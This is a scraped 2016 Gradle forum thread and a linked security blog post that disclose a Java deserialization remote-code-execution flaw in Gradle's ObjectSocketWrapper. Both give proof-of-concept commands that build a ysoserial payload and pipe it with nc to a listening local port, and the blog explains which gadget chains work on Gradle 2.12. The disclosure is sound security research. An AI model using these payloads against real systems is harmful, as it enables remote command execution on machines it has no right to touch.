=== Content from discuss.gradle.org_aa210471_20250124_204620.html ===


[Gradle Forums](/)

# [A security issue about gradle RCE](/t/a-security-issue-about-gradle-rce/17726)

[Old Forum Archive](/c/old-forum/bugs/11)

[Bugs](/c/old-forum/bugs/11)

[rootredrain](https://discuss.gradle.org/u/rootredrain)
(redrain)

May 23, 2016, 8:22pm

1

I can’t find the security issue report mail…the info@gradle.org didn’t answer me＝。＝

if you have any problem about this issue plz connect me rootredrain@gmail.com

Hi：

I found a vulnerabililty in gradle. This project use

ObjectSocketWrapper class to deserialize data, this class is used in

the jetty subproject and ui subproject,however this class has a object

readObject(), it achieved through the new ObjectInputStream ,

[github.com](https://github.com/gradle/gradle/blob/f490bdf61bd9b4f5383cd9fb0d8ffbca93da8c32/subprojects/ui/src/main/java/org/gradle/foundation/ipc/basic/ObjectSocketWrapper.java#L51)

#### [gradle/gradle/blob/f490bdf61bd9b4f5383cd9fb0d8ffbca93da8c32/subprojects/ui/src/main/java/org/gradle/foundation/ipc/basic/ObjectSocketWrapper.java#L51](https://github.com/gradle/gradle/blob/f490bdf61bd9b4f5383cd9fb0d8ffbca93da8c32/subprojects/ui/src/main/java/org/gradle/foundation/ipc/basic/ObjectSocketWrapper.java#L51)

```

41. } catch (SocketException e) {
42. logger.error("Failed to set timeout", e);
43. }
44. }
46. public Object readObject() {
48. ObjectInputStream reader = null;
50. try {
51. reader = new ObjectInputStream(socket.getInputStream());
52. } catch (SocketException e) {
53. if (!isIgnorableException(e)) {
54. logger.error("Reading Object", e);
55. }
56. return null;
57. } catch (Exception e) {
58. logger.error("Reading Object", e);
59. return null;
60. }

```

this method flow from the serialization vulnerability.

PoC:

we can use the ysoserial project to create payload easily, gradle will

open a socket and wait for a client to send serialized data

java -jar ysoserial-0.0.5-SNAPSHOT-all.jar CommonsBeanutils1 “touch

/tmp/rr” > /tmp/payload

cat /tmp/payload |nc 127.0.0.1 [port]

Regards,

redrain

[philwantsfish](https://discuss.gradle.org/u/philwantsfish)
(Philip OKeefe)

May 24, 2016, 7:27pm

2

I was coming to report this issue, but it looks like someone read my blogpost and reported it already ( <http://philwantsfish.github.io/security/java-deserialization-github> )

Neither of the subprojects are vulnerable at the moment so fixing these is not urgent. Exploiting this vulnerability will require finding a new gadget chain. Particularly you will want to be careful about what new dependencies you add to the projects until the issue is fixed. For advice or help you can reach me at okeefephil@gmail.com

### Related topics

| Topic |  | Replies | Views | Activity |
| --- | --- | --- | --- | --- |
| [Can't Publish Scan Behind Proxy](https://discuss.gradle.org/t/cant-publish-scan-behind-proxy/33894)  [scans.gradle.com](/c/help-discuss/scans/32) | 4 | 1601 | June 25, 2020 |
| [URGENT: SSL Apache configuration for services.gradle.org is bad](https://discuss.gradle.org/t/urgent-ssl-apache-configuration-for-services-gradle-org-is-bad/8808)  [Help/Discuss](/c/help-discuss/14) | 14 | 20977 | August 27, 2015 |
| [[Solved] SSL Errors when calling gradlew](https://discuss.gradle.org/t/solved-ssl-errors-when-calling-gradlew/14806)  [Help/Discuss](/c/help-discuss/14) | 2 | 15358 | March 31, 2016 |
| [Unexpected exception thrown. org.gradle.messaging.remote.internal.MessageIOException: Could not read message from '/0](https://discuss.gradle.org/t/unexpected-exception-thrown-org-gradle-messaging-remote-internal-messageioexception-could-not-read-message-from-0/1095)  [Old Forum Archive](/c/old-forum/13) | 1 | 6246 | September 2, 2013 |
| [Testing Gradle dependencies for security vulnerabilities](https://discuss.gradle.org/t/testing-gradle-dependencies-for-security-vulnerabilities/23568)  [News](/c/news/17) | 2 | 1728 | August 3, 2017 |

* [Home](/)
* [Categories](/categories)
* [Guidelines](/guidelines)
* [Terms of Service](http://gradle.org/tos)
* [Privacy Policy](http://gradle.org/privacy)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled

* [Docs](https://gradle.org/docs)
* [Blog](https://blog.gradle.org/)
* [Newsletter](https://newsletter.gradle.org/)
* [DPE University](https://dpeuniversity.gradle.com/app/)
* [Develocity](https://gradle.com/develocity)



=== Content from philwantsfish.github.io_6f726323_20250124_204620.html ===

philwantsfish

* [Home (current)](/)
* [Posts](/posts)
* [Projects](/projects)

## [Exploring Java deserialization in GitHub](/security/java-deserialization-github)

<Deserialization>

 22 May 2016

---

The [ysoserial](https://github.com/frohoff/ysoserial) makes Java deserialization vulnerabilities easy to exploit and [Stephen Breen](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/) demonstrated the majority of Java web servers are vulnerable. I thought it would be interesting to see how common deserialization is in open source Java projects.

## Searching GitHub

I developed a [script](https://github.com/philwantsfish/GitHubSearch) to search and sort the most popular repositories on GitHub by language. Searching the 200 most popular Java repositories for uses of `new ObjectInputStream` showed:

![GitHub top 200 chart](/files/java-deserialized-chart.png)

16 percent of Java repositories explicitly create and use an ObjectInputStream. Using an ObjectInputStream doesn’t mean the program is vulnerable - a vulnerability exists when the ObjectInputStream processes data from an untrusted source and the class path contains a “gadget chain”.

The majority of the above projects, especially Android projects, use serialization to persist an object to disk and restore it later. If an attacker can modify files then this bug is unlikely to elevate their privileges. But there is a few projects that accept data remotely and deserialize it! Lets explore attempting to exploit one of them.

*Note: The real percentage of Java projects using serialization is likely much higher because popular frameworks internally use serialization.*

## Serialization in Gradle

When writing this blog post Gradle was the 101st most popular Java project on GitHub with more than 3500 stars. This project is an extremely popular build system for Java and is the standard build system for Android.

Gradle deserializes data in the [ObjectSocketWrapper](https://github.com/gradle/gradle/blob/f490bdf61bd9b4f5383cd9fb0d8ffbca93da8c32/subprojects/ui/src/main/java/org/gradle/foundation/ipc/basic/ObjectSocketWrapper.java#L51) class. This class is used in the jetty subproject [here](https://github.com/gradle/gradle/blob/f490bdf61bd9b4f5383cd9fb0d8ffbca93da8c32/subprojects/jetty/src/main/java/org/gradle/api/plugins/jetty/internal/Jetty6PluginServer.java#L111) and the ui subproject [here](https://github.com/gradle/gradle/blob/f490bdf61bd9b4f5383cd9fb0d8ffbca93da8c32/subprojects/ui/src/main/java/org/gradle/foundation/ipc/gradle/TaskListClientProtocol.java#L127) and [here](https://github.com/gradle/gradle/blob/f490bdf61bd9b4f5383cd9fb0d8ffbca93da8c32/subprojects/ui/src/main/java/org/gradle/foundation/ipc/gradle/ExecuteGradleCommandClientProtocol.java#L82). Both of these plugins open a socket and wait for a client to connect and send serialized data.

The ui subproject is easy to work with, it can be launched by executing *./gradlew –gui*.

```
$ ./gradlew --gui &
[1] 62481
$ lsof -i
... snip ...
java      59699 pokeefe  182u  IPv6 0xb34e0a81bf8fe953      0t0  TCP *:60024 (LISTEN)
... snip ...
```

An ephemeral port opened and is listening for connections on all interfaces.

## Confirming the vulnerability

To confirm the vulnerability lets send a serialized object and confirm the program attempted to deserialized it. I built the project in Intellij Idea and attached breakpoints on the socket accept and readObject method. Sending an arbitrary payload from ysoserial to the socket:

```
$ lsof -i
... snip ...
java      60042 pokeefe   85u  IPv6 0xb34e0a81a122b933      0t0  TCP *:61973 (LISTEN)
... snip ...
$ java -jar ysoserial-0.0.5-SNAPSHOT-all.jar CommonsBeanutils1 "" > /tmp/payloads/commonsbeanutils1
$ cat /tmp/payloads/commonsbeanutils1 | nc 127.0.0.1 61973
```

Stepping through the readObject method confirms the program attempted to deserialize the CommonsBeanutils1 payload

![Intellij Debugging](/files/intellij-debug.png)

At this point we can consider the ui subproject and jetty subproject vulnerable. Successful exploitation depends on finding a gadget chain in the projects classpath.

## Exploitation

Each projects dependencies can be listed using the gradle task *dependencies* and executing ysoserial with no arguments lists the known gadget chains. Cross checking these two lists:

 Library | Vulnerable version | ui-subproject version | Exploitable || BeanShell1 | org.beanshell:bsh:2.0b5 | n/a | N |
| C3P0 | com.mchange:c3p0:0.9.5.2, com.mchange:mchange-commons-java:0.2.11 | n/a | N |
| CommonsBeanutils1 | commons-beanutils:commons-beanutils:1.9.2, commons-collections:commons-collections:3.1, commons-logging:commons-logging:1.2 | n/a | N |
| CommonsCollections1 | commons-collections:commons-collections:3.1 | Commons collections 3.2.2 | N |
| CommonsCollections2 | org.apache.commons:commons-collections4:4.0 | Commons collections 3.2.2 | N |
| commonscollections3 | commons-collections:commons-collections:3.1 | commons collections 3.2.2 | n |
| commonscollections4 | org.apache.commons:commons-collections4:4.0 | commons collections 3.2.2 | n |
| commonscollections5 | commons-collections:commons-collections:3.1 | commons collections 3.2.2 | n |
| fileupload1 | commons-fileupload:commons-fileupload:1.3.1, commons-io:commons-io:2.4 | n/a | n |
| groovy1 | org.codehaus.groovy:groovy:2.3.9 | groovy 2.4.4 | n |
| jdk7u21 | jdk7u21 |  | ? |
| jython1 | org.python:jython-standalone:2.5.2 | n/a | n |
| spring1 | org.springframework:spring-core:4.1.4.release, org.springframework:spring-beans:4.1.4.release | n/a | n |
| Spring2 | org.springframework:spring-core:4.1.4.RELEASE, org.springframework:spring-aop:4.1.4.RELEASE, aopalliance:aopalliance:1.0, commons-logging:commons-logging:1.2 | n/a | N |

The projects dependencies are all non-vulnerable versions. Downgrading to [Gradle 2.12](https://gradle.org/gradle-download/) and checking the library versions again shows commons-collections 3.2.1. The commons-collections5 payload in ysoserial successful executes an arbitary commands.

Looking through the Gradle release notes this vulnerability was not mentioned, I suspect the developers were unaware of it and were just upgrading their libraries. I’ve requested CVE-2016-6199 to track this vulnerability.

## Concluding thoughts

If you are running Gradle 2.12 or earlier you should upgrade. While this post details exploiting the UI subproject, the Jetty subproject is similarly vulnerable. The searching script found more projects that appear vulnerable. It might also be interesting to identify and search for framework APIs that wrap serialization.

---

[Read more posts!](/)


